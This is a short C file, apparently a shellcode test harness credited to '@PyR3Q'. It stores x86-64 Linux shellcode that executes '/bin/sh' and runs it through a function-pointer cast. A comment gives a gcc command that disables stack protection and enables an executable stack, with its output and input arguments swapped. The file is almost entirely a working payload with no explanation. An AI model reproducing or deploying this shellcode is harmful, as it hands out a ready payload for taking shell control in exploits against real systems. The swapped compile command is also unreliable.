/* @PyR3Q */
/* gcc -fno-stack-protector -z execstack -o shellcode.c shellcode */

#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x54\x5f\xb8\x3b\x00\x00\x00\x50\x99\x0f\x05";

int main()
{
	int(*f)() = (int(*)())shellcode;
	f();
	return 0;
}
